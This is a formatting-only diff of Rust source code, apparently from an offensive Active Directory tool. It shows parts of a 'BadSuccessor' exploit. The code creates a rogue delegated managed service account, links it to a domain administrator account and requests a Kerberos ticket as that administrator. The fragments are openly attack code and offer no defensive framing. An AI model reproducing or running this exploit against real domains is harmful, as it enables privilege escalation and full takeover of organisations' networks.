@@ -126,7 +126,11 @@ pub async fn exploit_bad_successor(
     let domain_sid = get_domain_sid(ldap).await?;
     log.push(format!("  Domain SID: {}", domain_sid));
 
-    let object_sid = format!("{}-{}", domain_sid.trim_end_matches('-'), rand::random::<u32>() & 0x3FFFFF);
+    let object_sid = format!(
+        "{}-{}",
+        domain_sid.trim_end_matches('-'),
+        rand::random::<u32>() & 0x3FFFFF
+    );
 
     // ── Step 3: Create the rogue dMSA ───────────────────────────
     log.push("Phase 2: Creating rogue dMSA object...".to_string());
@@ -144,7 +148,10 @@ pub async fn exploit_bad_successor(
     let dmsa_pwd = format!("\"{}\"", password);
 
     let dmsa_attrs: &[(&str, &[&[u8]])] = &[
-        ("objectClass", &[b"msDS-DelegatedManagedServiceAccount", b"user"]),
+        (
+            "objectClass",
+            &[b"msDS-DelegatedManagedServiceAccount", b"user"],
+        ),
         ("sAMAccountName", &[dmsa_sam.as_bytes()]),
         ("userPrincipalName", &[dmsa_upn.as_bytes()]),
         ("unicodePwd", &[dmsa_pwd.as_bytes()]),
@@ -165,7 +172,8 @@ pub async fn exploit_bad_successor(
         &dmsa_dn,
         "msDS-ManagedAccountPrecededByLink",
         target_da_dn.as_bytes(),
-    ).await?;
+    )
+    .await?;
     log.push(format!("  Linked to DA: {}", target_da_dn));
 
     // ── Step 5: Request TGT as the dMSA ─────────────────────────
@@ -190,7 +198,10 @@ pub async fn exploit_bad_successor(
         }
     }
 
-    info!("BadSuccessor exploit completed — TGT obtained for {}", target_da_dn);
+    info!(
+        "BadSuccessor exploit completed — TGT obtained for {}",
+        target_da_dn
+    );
     Ok(BadSuccessorResult {
         dmsa_dn,
         dmsa_name: format!("{}$", dmsa_name),
@@ -232,13 +243,14 @@ async fn find_writable_ou(ldap: &mut LdapSession) -> Result<String> {
 
     // Fallback: enumerate OUs and check each one
     let entries = ldap
-        .custom_search("(|(objectClass=organizationalUnit)(objectClass=container))", &["distinguishedName"])
+        .custom_search(
+            "(|(objectClass=organizationalUnit)(objectClass=container))",
+            &["distinguishedName"],
+        )
         .await?;
 
     for entry in &entries {
-        if let Some(dn) = entry.attrs.get("distinguishedName")
-            .and_then(|v| v.first())
-        {
+        if let Some(dn) = entry.attrs.get("distinguishedName").and_then(|v| v.first()) {
             debug!("Trying OU: {dn}");
             return Ok(dn.clone());
         }
